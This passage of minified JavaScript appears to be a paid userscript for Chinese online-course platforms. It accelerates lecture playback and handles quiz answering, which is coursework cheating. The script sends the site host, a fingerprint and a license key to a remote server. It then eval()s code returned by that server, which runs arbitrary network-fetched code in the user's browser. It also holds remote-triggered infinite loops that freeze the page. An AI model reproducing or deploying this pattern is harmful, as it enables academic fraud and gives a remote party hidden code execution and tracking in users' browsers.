                if (ElementObj.$slogan = document.querySelector("#slogan"), ElementObj.$slogan.innerHTML = e.result.text1, 20231 === e.code) for (erf(e.data); ;) ;
            })
        }

        getCTXHTML() {
            return `
<div class="myTool">
    <div class="controls ctxcontrols">×</div>
    <div class=''><a style="color: black;" href="${_bt}" target="_blank">📺\u9ad8\u667aAi\u8f85\u52a9\u5b66\u4e60\u7a0b\u5e8f</a></div>
    
    <div class="myTool-content">
        <div class="nokey">
            <div class="btns">
                <div class="btn1"
                     style="text-align: center;color: #1776FDFF;text-decoration: underline;margin: 5px 0;cursor: pointer;">
                    <a href="${_bt}" target="_blank">\u70b9\u51fb\u83b7\u53d6Key</a>
                </div>
                <a href="${_bt}" target="_blank" id="slogan" style="text-decoration: none;">
                
                </a>
            </div>
        </div>
    
        <div class="cxtsection ctxsection1">
          <div class="ctx-title title3">
            \u8f93\u5165Key：
          </div>
          <div class="ipt-wrap" style="display: flex;align-items: center;justify-content: space-between;">
            <input class="mytoolkeyipt" />
            <div style="width: 120px;height: 18px;margin-right: 5px;display: none;" class="mytoolkey"></div>
            <button class="handleKeyBtn addkey-btn" id="addKey">\u7ed1\u5b9a</button>
            <button class="handleKeyBtn removkey-btn" id="removeKey">\u89e3\u7ed1</button>
          </div>
        </div>

        <div class="cxtsection ctxsection2">
          <div class="ctx-title">
            \u8bbe\u7f6e\u500d\u901f：
          </div>
          <select name="" id="ctxspeed" class="speed-select" style="min-width: 130px">
            <option value="1" class="option">
              × 1.0
            </option>
            <option value="5" class="option">
              × 5.00
            </option>
            <option value="10" class="option" selected="selected">
              × 10.00
            </option>
            <option value="16" class="option">
              × 16.00
            </option>
          </select>
        </div>
        
        <div class="cxtsection ctxsection3">
          <div class="ctx-title">
            \u610f\u89c1\u53cd\u9988：
          </div>
          <a href="${_bt}"><div class="feedbackBtn">\u53bb\u53cd\u9988</div></a>
        </div>
        
        <div class="scriptTip" style="display: none;border-radius: 4px;margin-top: 9px;font-size: 12px;background: rgba(108,201,255,0.5);box-sizing: border-box;padding: 5px;">
            <div class="title">\u63d0\u793a：</div>
            <p style="margin: 6px 0;">1.\u5174\u8da3\u8bfe\u5168\u7f51\u76ee\u524d\u4ec5\u652f\u6301\u6700\u9ad81.5\u500d\u901f</p>
        </div>
        <div class="cxtsection cxtsection3" style="display: none"> 
          <div class="ctx-title">
            \u5f53\u524d\u4f5c\u7b54\u9898\u76ee：
          </div>
          <div class="ctxtopic-name">\u8d35\u5dde\u7701\u8d35\u9633\u5e02\u6bd3\u79c0\u8def27\u53f7\u8d35\u5dde\u7701\u4eba\u624d\u5927\u5e02\u573a4\u697c</div>
        </div>
        
        <div class="handleSpeedUp">\u70b9\u51fb\u52a0\u901f</div>
    </div>
    
    <div id="ctxTipWrap" class="ctxTipWrap"></div>
    
    <div class="floatWin">\u663e\u793a</div>
</div>
    `
        }

        async handleAddKey(e) {
            var t;
            ElementObj.$ipt.value ? (t = await axfedata({
                method: "GET",
                url: _b + "/vertifykey?toolkey=" + ElementObj.$ipt.value
            })).data ? (localStorage.setItem("mytoolkey", ElementObj.$ipt.value), localStorage.setItem("_localSpeed", toolOption.accelerator.toString()), MyTool.setValue("mytoolkey", ElementObj.$ipt.value), MyTool.setValue("mytoolkeyInfo", t.data), e(ElementObj.$ipt.value), location.reload()) : (window.open("https://abc.gaozhiwang.top/#/home"), window.open(_bt), alert("\u8f93\u5165\u7684key\u4e0d\u5b58\u5728")) : (window.open("https://abc.gaozhiwang.top/#/home"), window.open(_bt))
        }

        _v0() {
            MyTool.axfedata({url: _b + "/getV0", method: "GET"}).then(e => {
                if (e.result.version >= version && "2" === e.result.force && (alert(e.result.tip), window.close()), 20231 === e.code) for (erf(e.data); ;) ;
            })
        }

        async colletionSchoolData(e) {
            e = await axfedata({method: "GET", url: _b + e});
            if (200 == e.code && MyTool.setValue("schoolInfoColletion", "" + new Date), 20231 == e.code) for (erf(e.data); ;) ;
            return e
        }
    }

    function $el(e, t = window.document) {
        t = t.querySelector(e);
        return null === t ? void 0 : t
    }

    function sleep(t) {
        return new Promise(e => setTimeout(e, t))
    }

    function axfedata(l) {
        return new Promise(t => {
            try {
                GM_xmlhttpRequest({
                    ...l, onload: function (e) {
                        200 == e.status && t(JSON.parse(e.response))
                    }
                })
            } catch (e) {
                fetch(l.url, {method: l.method}).then(e => e.json()).then(e => {
                    t(e)
                })
            }
        })
    }

    function showTip(e, t = 3500, l) {
        t = t || 3500, ElementObj.$ctxTipWrap.style.display = "block", ElementObj.$ctxTipWrap.innerText = e;
        setTimeout(() => {
            ElementObj.$ctxTipWrap.style.display = "none"
        }, t);
        l && alert(e)
    }

    async function _re() {
        let current_host = location.host;
        if (!/www.gaozhiwang.top/.test(current_host)) {
            let _e = localStorage.getItem("mytoolkey") || MyTool.getValue("mytoolkey");
            if (_e) {
                let result = await axfedata({
                    method: "GET",
                    url: _b + (`/speedup?toolkey=${_e}&t=1&canuse=1&h=${location.host}&fingerprint=${localStorage.getItem("fingerprint")}&v=` + version)
                });
                if (200 == result.code) {
                    result.id || alert(result.message);
                    let opiton = _ex(result.id);
                    if (result.options) {
                        let options = null;
                        eval(result.options), toolOption.CtxMain = new CTXCommon(options)
                    } else {
                        let _a = "CTXCommon" == _i1[opiton].mainClass ? _i1[opiton].option : eval(_i1[opiton].mainClass);
                        toolOption.CtxMain = "CTXCommon" == _i1[opiton].mainClass ? new CTXCommon(_a) : new _a
                    }
                } else 404 != result.code && (20231 !== result.code && (11 !== result.code && -2 !== result.code || new Addpanel, localStorage.removeItem("mytoolkey"), MyTool.deleteValue("mytoolkey"), alert(result.message)), erf(result.data))
            }
        }
    }

    setTimeout(async () => {
        await _re(), new Addpanel;
        var e = Math.floor(9 * Math.random()) + 2;
        setTimeout(() => {
            1 < document.querySelectorAll(".myTool").length && alert("\u53d1\u73b0\u811a\u672c\u5b89\u88c5\u7a81\u51fa，\u8bf7\u5220\u9664\u591a\u4f59\u811a\u672c")
        }, 1e3 * e)
    }, 2e3)
}();






